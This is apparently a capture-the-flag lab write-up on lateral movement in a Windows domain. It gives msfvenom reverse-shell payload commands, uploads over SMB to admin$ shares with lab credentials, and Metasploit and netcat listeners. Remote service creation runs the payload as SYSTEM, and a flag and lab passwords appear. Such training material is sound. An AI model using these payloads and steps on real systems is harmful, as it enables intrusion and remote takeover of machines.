## Lateral Movement and Pivoting

``` Your credentials have been generated: Username: henry.bird Password: Changeme123 ```

### Task 3 - Spawning Processes Remotely

### Creating reverse shell payload exe
```bash
#On AttackBox
msfvenom -p windows/shell/reverse_tcp -f exe-service LHOST=10.50.49.15 LPORT=4444 -o msfvenom-payload.exe
```

### Pushing payload to target machine
```bash
#On AttackBox
smbclient -c 'put msfvenom-payload.exe' -U t1_leonard.summers -W ZA '//thmiis.za.tryhackme.com/admin$/' EZpass4ever
```

### Start Metasploit reverse shell server
```bash
#On AttackBox
msfconsole
msf5 > use exploit/multi/handler 
[*] Using configured payload generic/shell_reverse_tcp
msf5 exploit(multi/handler) > set LHOST lateralmovement
LHOST => lateralmovement
msf5 exploit(multi/handler) > set LPORT 4444
LPORT => 4444
msf5 exploit(multi/handler) > set payload windows/shell/reverse_tcp
payload => windows/shell/reverse_tcp
msf5 exploit(multi/handler) > exploit

[*] Started reverse TCP handler on 10.50.49.15:4444
```

### Reverse shell session, create and start service on target machine
```bash
#On AttackBox
 nc -lvp 4443
 Listening on [0.0.0.0] (family 0, port 4443)
Connection from ip-10-200-51-249.eu-west-1.compute.internal 54509 received!
#On THMJMP2 (As admin)
C:\Windows\system32>sc.exe \\thmiis.za.tryhackme.com create THMservice-4444 binPath= "%windir%\msfvenom-payload.exe" start= auto
sc.exe \\thmiis.za.tryhackme.com create THMservice-4444 binPath= "%windir%\msfvenom-payload.exe" start= auto
[SC] CreateService SUCCESS

C:\Windows\system32>sc.exe \\thmiis.za.tryhackme.com start THMservice-4444
sc.exe \\thmiis.za.tryhackme.com start THMservice-4444

SERVICE_NAME: THMservice-4444 
        TYPE               : 10  WIN32_OWN_PROCESS  
        STATE              : 4  RUNNING 
                                (NOT_STOPPABLE, NOT_PAUSABLE, IGNORES_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x0
        PID                : 3524
        FLAGS              : 

C:\Windows\system32>
```

### THMIIS reverse shell to run flag.exe
```bash
#On THMIIS
C:\Windows\system32>whoami
whoami
nt authority\system

C:\Windows\system32>cd C:\Users\t1_leonard.summers\Desktop
cd C:\Users\t1_leonard.summers\Desktop

C:\Users\t1_leonard.summers\Desktop>flag.exe
flag.exe
THM{MOVING_WITH_SERVICES}
```

### Task 4 - Moving Laterally Using WMI

### Create MSI payload

```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=lateralmovement LPORT=4445 -f msi > payload.msi
```


### Pushing payload to target machine
```bash
smbclient -c 'put payload.msi' -U t1_corine.waters -W ZA '//thmiis.za.tryhackme.com/admin$' Korine.1994
```

